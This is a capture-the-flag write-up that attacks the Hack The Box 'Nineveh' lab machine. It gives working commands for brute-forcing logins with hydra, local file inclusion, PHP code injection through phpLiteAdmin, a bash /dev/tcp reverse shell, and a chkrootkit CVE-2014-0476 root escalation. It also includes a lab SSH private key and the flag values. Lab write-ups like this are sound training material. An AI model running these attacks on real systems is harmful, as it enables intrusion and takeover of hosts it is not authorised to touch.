# Target
| Category          | Details                                                                                                                   |
|-------------------|---------------------------------------------------------------------------------------------------------------------------|
| 📝 **Name**       | [Nineveh](https://app.hackthebox.com/machines/Nineveh)                                                                    |  
| 🏷 **Type**       | HTB Machine                                                                                                               |
| 🖥 **OS**         | Linux                                                                                                                     |
| 🎯 **Difficulty** | Medium                                                                                                                    |
| 📁 **Tags**       | hydra, LFI, phpLiteAdmin v1.9, port knocking, chkrootkit, [CVE-2014-0476](https://nvd.nist.gov/vuln/detail/CVE-2014-0476) |

### User flag

#### Scan target with `nmap`
```
┌──(magicrc㉿perun)-[~/attack/HTB Nineveh]
└─$ nmap -sS -sC -sV -p- $TARGET
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-10 06:28 +0100
Nmap scan report for 10.129.6.20
Host is up (0.035s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT    STATE SERVICE  VERSION
80/tcp  open  http     Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
443/tcp open  ssl/http Apache httpd 2.4.18 ((Ubuntu))
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.18 (Ubuntu)
| ssl-cert: Subject: commonName=nineveh.htb/organizationName=HackTheBox Ltd/stateOrProvinceName=Athens/countryName=GR
| Not valid before: 2017-07-01T15:03:30
|_Not valid after:  2018-07-01T15:03:30
|_http-title: Site doesn't have a title (text/html).

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 159.59 seconds
```

#### Enumerate SSL certificate
```
┌──(magicrc㉿perun)-[~/attack/HTB Nineveh]
└─$ openssl s_client -connect $TARGET:443 </dev/null 2>/dev/null | openssl x509 -inform pem -text | grep Subject | head -n 1
        Subject: C=GR, ST=Athens, L=Athens, O=HackTheBox Ltd, OU=Support, CN=nineveh.htb, emailAddress=admin@nineveh.htb
```

#### Add `nineveh.htb` to `/etc/hosts`
```
┌──(magicrc㉿perun)-[~/attack/HTB Nineveh]
└─$ echo "$TARGET nineveh.htb" | sudo tee -a /etc/hosts                
10.129.6.20 nineveh.htb
```

#### Enumerate web application running at port 80
```
┌──(magicrc㉿perun)-[~/attack/HTB Nineveh]
└─$ feroxbuster --url http://nineveh.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,js,png,jpg,py,txt,log -C 404 
<SNIP>
200      GET        5l       25w      178c http://nineveh.htb/
200      GET        5l       25w      178c http://nineveh.htb/index.html
200      GET      977l     5005w    83681c http://nineveh.htb/info.php
301      GET        9l       28w      315c http://nineveh.htb/department => http://nineveh.htb/department/
200      GET        1l        3w       68c http://nineveh.htb/department/index.php
200      GET       57l      109w     1560c http://nineveh.htb/department/login.php
200      GET       21l       40w      670c http://nineveh.htb/department/header.php
200      GET        7l        4w       51c http://nineveh.htb/department/footer.php
200      GET        4l        7w       57c http://nineveh.htb/department/css/nineveh.css
301      GET        9l       28w      321c http://nineveh.htb/department/files => http://nineveh.htb/department/files/
200      GET     4656l     9502w    81933c http://nineveh.htb/department/css/bootstrap.css
301      GET        9l       28w      319c http://nineveh.htb/department/css => http://nineveh.htb/department/css/
200      GET        1l        3w       68c http://nineveh.htb/department/files/index.php
200      GET        1l        3w       68c http://nineveh.htb/department/css/
200      GET        1l        3w       68c http://nineveh.htb/department/css/index.php
302      GET        0l        0w        0c http://nineveh.htb/department/logout.php => login.php
302      GET        0l        0w        0c http://nineveh.htb/department/manage.php => login.php
<SNIP>
```

#### Discover admin panel at `http://nineveh.htb/department/index.php`
```
┌──(magicrc㉿perun)-[~/attack/HTB Nineveh]
└─$ curl http://nineveh.htb/department/login.php
<SNIP>
    <form action="login.php" method="POST" class="form-horizontal">
      <div class="form-group">
        <label for="name">Username:</label>
        <input type="text" name="username"  class="form-control"  autofocus="true">
      </div>
      <div class="form-group">
        <label for="password">Password:</label>
        <input type="password" name="password"  class="form-control"  >
      </div>
      <div class="checkbox">
        <label>
          <input type="checkbox" name="rememberme"> Remember me
        </label>
      </div>
      <button type="submit" class="btn btn-default">Log in</button>
    </form>
  </div>
</div>

<!-- @admin! MySQL is been installed.. please fix the login page! ~amrois -->
<SNIP>
```
Enumeration with `sqlmap` did not yield any results. After using `admin` as user and providing invalid password `Invalid Password!` error message has been returned. We could assume that `admin` is correct user and use in dictionary attack.

#### Use `hydra` to conduct dictionary attack against admin panel using `admin` user
```
┌──(magicrc㉿perun)-[~/attack/HTB Nineveh]
└─$ hydra -I nineveh.htb http-post-form "/department/login.php:username=^USER^&password=^PASS^:Invalid Password" -l admin -P /usr/share/wordlists/rockyou.txt  
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-03-10 07:17:13
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344400 login tries (l:1/p:14344400), ~896525 tries per task
[DATA] attacking http-post-form://nineveh.htb:80/department/login.php:username=^USER^&password=^PASS^:Invalid Password
[STATUS] 2574.00 tries/min, 2574 tries in 00:01h, 14341826 to do in 92:52h, 16 active
[80][http-post-form] host: nineveh.htb   login: admin   password: 1q2w3e4r5t
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-03-10 07:19:02
```
`admin:1q2w3e4r5t` credentials has been discovered.

#### Access admin panel using `admin:1q2w3e4r5t` credentials
```
┌──(magicrc㉿perun)-[~/attack/HTB Nineveh]
└─$ curl -L -s -c cookies.txt http://nineveh.htb/department/login.php -d 'username=admin&password=1q2w3e4r5t' -o /dev/null && \
curl -b cookies.txt http://nineveh.htb/department/manage.php?notes=files/ninevehNotes.txt
<SNIP>
<pre>
<pre><li>Have you fixed the login page yet! hardcoded username and password is really bad idea!</li>
<li>check your serect folder to get in! figure it out! this is your challenge</li>
<li>Improve the db interface.
<small>~amrois</small>
</pre>
</pre> 
<SNIP>
```
After successful authentication we were able to find the note which is mentioning secret folder and database interface. Additionally `/manage.php?notes=files/ninevehNotes.txt` HTTP GET parameter might open LFI attack vector. After enumeration, it looks that `ninevehNotes` must be part of `notes` HTTP GET parameter. 

#### Enumerate `/manage.php?notes` looking for LFI
```
┌──(magicrc㉿perun)-[~/attack/HTB Nineveh]
└─$ ffuf -r -u 'http://nineveh.htb/department/manage.php?notes=/ninevehNotes/FUZZ' -H "Cookie: PHPSESSID=9pc2joff1bugtl0rkoh881qsu0" -w dotdotpwn.txt -mr root
<SNIP>
../etc/passwd           [Status: 200, Size: 2702, Words: 309, Lines: 74, Duration: 34ms]
../../etc/passwd        [Status: 200, Size: 2702, Words: 309, Lines: 74, Duration: 35ms]
../../../etc/passwd     [Status: 200, Size: 2702, Words: 309, Lines: 74, Duration: 37ms]
<SNIP>
``` 
LFI itself does not yield immediate foothold, thus we will continue our recon. 

#### Enumerate web application running at port 443
```
┌──(magicrc㉿perun)-[~/attack/HTB Nineveh]
└─$ feroxbuster --url https://nineveh.htb/ -k -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,js,png,jpg,py,txt,log -C 404
<SNIP>
200      GET        1l        3w       49c https://nineveh.htb/index.html
200      GET     2246l    12546w  1016797c https://nineveh.htb/ninevehForAll.png
200      GET        1l        3w       49c https://nineveh.htb/
301      GET        9l       28w      309c https://nineveh.htb/db => https://nineveh.htb/db/
200      GET      486l      974w    11430c https://nineveh.htb/db/index.php
<SNIP>
```
After accessing `https://nineveh.htb/db/index.php` we have landed at `phpLiteAdmin v1.9` login panel. `phpLiteAdmin v1.9` has multiple vulnerabilities, but most of them (if not all) requires successful authentication. Since only password is need, once again we will try dictionary attack.  

#### Use `hydra` to conduct dictionary attack against `phpLiteAdmin v1.9`
```
┌──(magicrc㉿perun)-[~/attack/HTB Nineveh]
└─$ hydra -I nineveh.htb https-post-form "/db/index.php:&password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password" -l admin -P /usr/share/wordlists/rockyou.txt
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-03-10 08:07:05
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344400 login tries (l:1/p:14344400), ~896525 tries per task
[DATA] attacking http-post-forms://nineveh.htb:443/db/index.php:&password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password
[443][http-post-form] host: nineveh.htb   login: admin   password: password123
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-03-10 08:07:54
```

#### Login to `phpLiteAdmin` using `password123` password
![phpLiteAdmin](images/phpliteadmin.png)

After login in `phpLiteAdmin` there is single SQLite database stored in `/var/tmp/test`. We could try to create one with `.php` extension and store PHP code in one of its tables.

#### Create SQLite database in `/var/tmp/cmd.php` with single table
![cmd.php_db.png](images/cmd.php_db.png)

#### Add `rce` of type `TEXT` column
![rce_column.png](images/rce_column.png)

#### Store PHP code for arbitrary command execution
![system_cmd.png](images/system_cmd.png)

#### Confirm RCE
```
┌──(magicrc㉿perun)-[~/attack/HTB Nineveh]
└─$ curl -b cookies.txt 'http://nineveh.htb/department/manage.php?notes=/ninevehNotes/../var/tmp/cmd.php&cmd=id' -o -
<SNIP>
<pre>
�� Iuid=33(www-data) gid=33(www-data) groups=33(www-data)
</pre>
<SNIP>
```

#### Start `nc` to listen for reverse shell connection
```
┌──(magicrc㉿perun)-[~/attack/HTB Nineveh]
└─$ nc -lvnp 4444              
listening on [any] 4444 ...
```

#### Use discovered RCE to spawn reverse shell connection
```
┌──(magicrc㉿perun)-[~/attack/HTB Nineveh]
└─$ CMD=$(echo "/bin/bash -c 'bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1'" | jq -sRr @uri) && \
curl -b cookies.txt "http://nineveh.htb/department/manage.php?notes=/ninevehNotes/../var/tmp/cmd.php&cmd=$CMD" -o -
```

#### Confirm foothold gained
```
connect to [10.10.15.157] from (UNKNOWN) [10.129.6.20] 51080
bash: cannot set terminal process group (1424): Inappropriate ioctl for device
bash: no job control in this shell
www-data@nineveh:/var/www/html/department$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

#### Discover SSH private key hidden in `/var/www/ssl/secure_notes/nineveh.png`
Key has been discovered with `linpeas.sh`
```
══╣ Possible private SSH keys were found!
/var/www/ssl/secure_notes/nineveh.png
```

```
www-data@nineveh:/$ strings /var/www/ssl/secure_notes/nineveh.png
<SNIP>
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAri9EUD7bwqbmEsEpIeTr2KGP/wk8YAR0Z4mmvHNJ3UfsAhpI
H9/Bz1abFbrt16vH6/jd8m0urg/Em7d/FJncpPiIH81JbJ0pyTBvIAGNK7PhaQXU
<SNIP>
il6RYzQV/2ULgUBfAwdZDNtGxbu5oIUB938TCaLsHFDK6mSTbvB/DywYYScAWwF7
fw4LVXdQMjNJC3sn3JaqY1zJkE4jXlZeNQvCx4ZadtdJD9iO+EUG
-----END RSA PRIVATE KEY-----
<SNIP>
```

#### Escalate to user `amrois` using SSH over target localhost
Since port 22 is filtered out we will connect over loopback interface.
```
www-data@nineveh:/$ ( cat <<'EOF'> /tmp/amrois_id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAri9EUD7bwqbmEsEpIeTr2KGP/wk8YAR0Z4mmvHNJ3UfsAhpI
H9/Bz1abFbrt16vH6/jd8m0urg/Em7d/FJncpPiIH81JbJ0pyTBvIAGNK7PhaQXU
PdT9y0xEEH0apbJkuknP4FH5Zrq0nhoDTa2WxXDcSS1ndt/M8r+eTHx1bVznlBG5
FQq1/wmB65c8bds5tETlacr/15Ofv1A2j+vIdggxNgm8A34xZiP/WV7+7mhgvcnI
3oqwvxCI+VGhQZhoV9Pdj4+D4l023Ub9KyGm40tinCXePsMdY4KOLTR/z+oj4sQT
X+/1/xcl61LADcYk0Sw42bOb+yBEyc1TTq1NEQIDAQABAoIBAFvDbvvPgbr0bjTn
KiI/FbjUtKWpWfNDpYd+TybsnbdD0qPw8JpKKTJv79fs2KxMRVCdlV/IAVWV3QAk
FYDm5gTLIfuPDOV5jq/9Ii38Y0DozRGlDoFcmi/mB92f6s/sQYCarjcBOKDUL58z
GRZtIwb1RDgRAXbwxGoGZQDqeHqaHciGFOugKQJmupo5hXOkfMg/G+Ic0Ij45uoR
JZecF3lx0kx0Ay85DcBkoYRiyn+nNgr/APJBXe9Ibkq4j0lj29V5dT/HSoF17VWo
9odiTBWwwzPVv0i/JEGc6sXUD0mXevoQIA9SkZ2OJXO8JoaQcRz628dOdukG6Utu
Bato3bkCgYEA5w2Hfp2Ayol24bDejSDj1Rjk6REn5D8TuELQ0cffPujZ4szXW5Kb
ujOUscFgZf2P+70UnaceCCAPNYmsaSVSCM0KCJQt5klY2DLWNUaCU3OEpREIWkyl
1tXMOZ/T5fV8RQAZrj1BMxl+/UiV0IIbgF07sPqSA/uNXwx2cLCkhucCgYEAwP3b
vCMuW7qAc9K1Amz3+6dfa9bngtMjpr+wb+IP5UKMuh1mwcHWKjFIF8zI8CY0Iakx
DdhOa4x+0MQEtKXtgaADuHh+NGCltTLLckfEAMNGQHfBgWgBRS8EjXJ4e55hFV89
P+6+1FXXA1r/Dt/zIYN3Vtgo28mNNyK7rCr/pUcCgYEAgHMDCp7hRLfbQWkksGzC
fGuUhwWkmb1/ZwauNJHbSIwG5ZFfgGcm8ANQ/Ok2gDzQ2PCrD2Iizf2UtvzMvr+i
tYXXuCE4yzenjrnkYEXMmjw0V9f6PskxwRemq7pxAPzSk0GVBUrEfnYEJSc/MmXC
iEBMuPz0RAaK93ZkOg3Zya0CgYBYbPhdP5FiHhX0+7pMHjmRaKLj+lehLbTMFlB1
MxMtbEymigonBPVn56Ssovv+bMK+GZOMUGu+A2WnqeiuDMjB99s8jpjkztOeLmPh
PNilsNNjfnt/G3RZiq1/Uc+6dFrvO/AIdw+goqQduXfcDOiNlnr7o5c0/Shi9tse
i6UOyQKBgCgvck5Z1iLrY1qO5iZ3uVr4pqXHyG8ThrsTffkSVrBKHTmsXgtRhHoc
il6RYzQV/2ULgUBfAwdZDNtGxbu5oIUB938TCaLsHFDK6mSTbvB/DywYYScAWwF7
fw4LVXdQMjNJC3sn3JaqY1zJkE4jXlZeNQvCx4ZadtdJD9iO+EUG
-----END RSA PRIVATE KEY-----
EOF
) && chmod 600 /tmp/amrois_id_rsa && \
ssh -i /tmp/amrois_id_rsa amrois@127.0.0.1
<SNIP>
You have mail.
<SNIP>
amrois@nineveh:~$ id
uid=1000(amrois) gid=1000(amrois) groups=1000(amrois)
```

#### Capture user flag
```
amrois@nineveh:~$ cat /home/amrois/user.txt 
e8e6aee004478619d51dd0e24c1a1581
```

### Root flag

#### Read `amrois` email to discover port knocking is in place
```
amrois@nineveh:~$ cat /var/mail/amrois 
From root@nineveh.htb  Fri Jun 23 14:04:19 2017
Return-Path: <root@nineveh.htb>
X-Original-To: amrois
Delivered-To: amrois@nineveh.htb
Received: by nineveh.htb (Postfix, from userid 1000)
        id D289B2E3587; Fri, 23 Jun 2017 14:04:19 -0500 (CDT)
To: amrois@nineveh.htb
From: root@nineveh.htb
Subject: Another Important note!
Message-Id: <20170623190419.D289B2E3587@nineveh.htb>
Date: Fri, 23 Jun 2017 14:04:19 -0500 (CDT)

Amrois! please knock the door next time! 571 290 911
```

#### Knock on ports from email
```
┌──(magicrc㉿perun)-[~/attack/HTB Nineveh]
└─$ python3 ~/Tools/KnockIt/knockit.py nineveh.htb 571 290 911
<SNIP>
[+] Knocking on port nineveh.htb:571
[+] Knocking on port nineveh.htb:290
[+] Knocking on port nineveh.htb:911
```

#### Rescan port 22
```
┌──(magicrc㉿perun)-[~/attack/HTB Nineveh]
└─$ nmap nineveh.htb -p22       
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-11 20:37 +0100
Nmap scan report for nineveh.htb (10.129.6.20)
Host is up (0.024s latency).

PORT   STATE SERVICE
22/tcp open  ssh

Nmap done: 1 IP address (1 host up) scanned in 0.18 seconds
```
SSH port is now open, and thus we could use exfiltrated SSH private key to gain access directly from attacker machine.

#### Discover `chkrootkit` being periodically executed as `root` as part of `/root/vulnScan.sh` 
```
2026/03/11 15:58:01 CMD: UID=0     PID=20732  | /bin/bash /root/vulnScan.sh 
2026/03/11 15:58:01 CMD: UID=0     PID=20736  | sed -e s/:/ /g 
2026/03/11 15:58:01 CMD: UID=0     PID=20735  | /bin/sh /usr/bin/chkrootkit
```
`chkrootkit` before version 0.50 is vulnerable [CVE-2014-0476](https://nvd.nist.gov/vuln/detail/CVE-2014-0476). In the essence it will execute `/tmp/update`. As in our case `chkrootkit` is being executed as `root` we could use `/tmp/update` to spawn root shell. 

#### Exploit [CVE-2014-0476](https://nvd.nist.gov/vuln/detail/CVE-2014-0476) to spawn root shell
```
amrois@nineveh:~$ echo '/bin/cp /bin/bash /tmp/root_shell && /bin/chmod +s /tmp/root_shell' > /tmp/update && chmod +x /tmp/update
```
Wait up to 1 minute for `/tmp/root_shell`.

#### Use `/tmp/root_shell` to escalate to `root`
```
amrois@nineveh:~$ /tmp/root_shell -p
root_shell-4.3# id
uid=1000(amrois) gid=1000(amrois) euid=0(root) egid=0(root) groups=0(root),1000(amrois)
```

#### Capture root flag
```
root_shell-4.3# cat /root/root.txt 
d7a2db8dcaf55917a640d4c53bcafa48
```
